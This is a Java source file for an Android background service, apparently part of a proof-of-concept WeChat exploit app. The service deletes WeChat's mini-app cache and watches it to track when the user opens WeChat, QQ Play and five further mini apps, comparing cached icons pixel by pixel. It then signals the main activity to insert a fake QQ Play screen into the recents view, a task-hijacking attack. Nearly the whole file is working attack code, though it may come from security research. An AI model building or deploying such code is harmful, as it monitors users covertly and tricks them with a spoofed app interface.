package com.example.wechatexploit;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

public class MaliciousBackgroundService extends IntentService {

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public MaliciousBackgroundService() {
        super("MaliciousBackgroundService");
    }

    /**
     * The procedure is as follows:
     * 1. Clear wxacache.
     * 2. Wechat will cache several things on startup. So, wait until the user opens Wechat and then
     * add these things to a blacklist so our app doesn't think that the user opened several mini
     * apps.
     * 3. Wait until the user opens QQ play.
     * 4. Wait until the user opens 5 more mini apps.
     * 5. Insert our fake QQ play app into the recents screen.
     */

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.w("MBS", "Successfully started intentService");

        Boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
        String id = "060fcd179da3b367fd750e10c172f0fd";

        if (isSDPresent) {
            // **** STEP 1 ****
            File storage = Environment.getExternalStorageDirectory();
            File root = new File(storage, "tencent/MicroMsg/wxacache");
            Log.w("MBS", "Cache is at " + root.getPath());

            // Remove everything in the cache
            for (File file : root.listFiles()) {
                file.delete();
            }

            // **** STEP 2 ****
            // Wait for user to open Wechat
            while (root.listFiles().length == 0) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Log.w("MBS", "Interrupted while waiting for user to open Wechat.");
                }
            }

            Log.w("MBS", "User opened Wechat! Waiting a few seconds for all caches to be re-downloaded...");

            // Wait until Wechat stops re-downloading caches.
            // We will consider Wechat to be "finished" re-downloading caches once the number of files remains constant for 1 second.
            while (true) {
                int previousNumberOfFiles = root.listFiles().length;
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Log.w("MBS", "Interrupted while waiting for user to open Wechat.");
                }
                if (previousNumberOfFiles == root.listFiles().length) {
                    break;
                }
            }

            Log.w("MBS", "Wechat finished re-downloading " + root.listFiles().length + " caches.");

            // Since these automatically downloaded caches do NOT indicate that a user opened a mini program, add these files to a blacklist.
            Set<File> blacklist = new HashSet<>(Arrays.asList(root.listFiles()));

            // If we accidentally included the QQ icon in the blacklist, remove it. This is unlikely but technically possible.
            for (File file : blacklist) {
                if (file.getName().equals(id)) {
                    blacklist.remove(file);
                    break;
                }
            }

            // **** STEP 3 ****
            // Look for QQ play until it appears
            boolean found = false;
            while (!found) {
                for (File file : root.listFiles()) {
                    if (file.getName().equals(id)) {
                        found = true;
                        Log.w("MBS", "Successfully found QQ Play.");
                    }
                }
            }

            // **** STEP 4 ****
            Log.w("MBS", "Clearing wxacache...");
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Log.w("MBS", "Interrupted while waiting for more caches to download.");
            }

            // Remove everything in the cache (again)
            for (File file : root.listFiles()) {
                file.delete();
            }
            Log.w("MBS", "Waiting for user to open 5 mini apps.");
            int numberMiniAppsOpen = getNumberOfOpenMiniApps(root.listFiles(), blacklist);
            while (numberMiniAppsOpen < 5) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Log.w("MBS", "Interrupted while waiting for user to open 5 mini apps.");
                }
                numberMiniAppsOpen = getNumberOfOpenMiniApps(root.listFiles(), blacklist);
                Log.w("MBS", "numberMiniAppsOpen returned: " + numberMiniAppsOpen);
            }
            Log.w("MBS", "User opened 5 mini apps! Ba ha ha ha.");
            Log.w("MBS", "QQ Play closed.");

            // **** STEP 5 ****
            //Send broadcast that qq play closed. if this doesn't work look into starting a new activity
            Intent intent1 = new Intent();
            intent1.setAction("QQ Play closed");
            sendBroadcast(intent1);

            // Tell the MainActivity to go ahead and insert its fake UI
            MainActivity.hijackFlag.set();


        } else {
            Log.w("MBS", "No SD card, can't do anything");
        }
    }

    private int getNumberOfOpenMiniApps(File[] files, Set<File> blacklist) {
        List<File> whitelist = new ArrayList<>();
        for (File file : files) {
            if (!blacklist.contains(file)) {
                whitelist.add(file);
            }
        }

        // Essentially, this removes duplicate images from the whitelist.
        for (int i = 0; i < whitelist.size() - 1; i++) {
            String basePath = whitelist.get(i).getAbsolutePath();
            // Sometimes Wechat will put random .wlock files in there... we'll just ignore them.
            if (basePath.contains(".wlock")) {
                whitelist.remove(i);
                i--;
                continue;
            }
            for (int j = i + 1; j < whitelist.size(); j++) {
                String compareToPath = whitelist.get(j).getAbsolutePath();
                if (compareToPath.contains(".wlock")) {
                    whitelist.remove(j);
                    j--;
                    continue;
                }
                if (iconsAreTheSame(basePath, compareToPath)) {
                    whitelist.remove(j);
                    j--;
                }
            }
        }
        return whitelist.size();
    }

    private static boolean iconsAreTheSame(String path1, String path2) {
        Bitmap bImage1 = BitmapFactory.decodeFile(path1);
        Bitmap bImage2 = BitmapFactory.decodeFile(path2);

        int width1 = bImage1.getWidth();
        int width2 = bImage2.getWidth();
        int height1 = bImage1.getHeight();
        int height2 = bImage2.getHeight();

        // Determine how much of each dimension of the image to compare (at most 50)
        // Compares the same number of pixels in each dimension
        int minWidth = Math.min(width1, width2);
        int minHeight = Math.min(height1, height2);
        int smallDimension = Math.min(minWidth, minHeight);
        int compareDimension = Math.min(50, smallDimension);

        float gap1 = ((float) Math.min(width1, height1)) / ((float) compareDimension);
        float gap2 = ((float) Math.min(width2, height2)) / ((float) compareDimension);

        int rDiffSum = 0;
        int bDiffSum = 0;
        int gDiffSum = 0;
        int comparedTotal = 0;
        for (int i = 0; i < compareDimension; i++) {
            for (int j = 0; j < compareDimension; j++) {
                int x1 = (int) (i * gap1);
                int y1 = (int) (j * gap1);
                int x2 = (int) (i * gap2);
                int y2 = (int) (j * gap2);

                int pixel1 = bImage1.getPixel(x1, y1);
                int pixel2 = bImage2.getPixel(x2, y2);
                // Only compare pixels if alpha values match
                if (((pixel1 >> 24) & 0xff) == ((pixel2 >> 24) & 0xff)) {
                    rDiffSum += Math.abs(((pixel1 >> 16) & 0xff) - ((pixel2 >> 16) & 0xff));
                    gDiffSum += Math.abs(((pixel1 >> 8) & 0xff) - ((pixel2 >> 8) & 0xff));
                    bDiffSum += Math.abs((pixel1 & 0xff) - (pixel2 & 0xff));
                    comparedTotal++;
                }
            }
        }

        float rDiffAvg = ((float) rDiffSum) / ((float) comparedTotal);
        float gDiffAvg = ((float) gDiffSum) / ((float) comparedTotal);
        float bDiffAvg = ((float) bDiffSum) / ((float) comparedTotal);

        return rDiffAvg < 35.0 && gDiffAvg < 35.0 && bDiffAvg < 35.0;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.w("MBS", "MyIntentService onCreate() method is invoked.");
    }
}
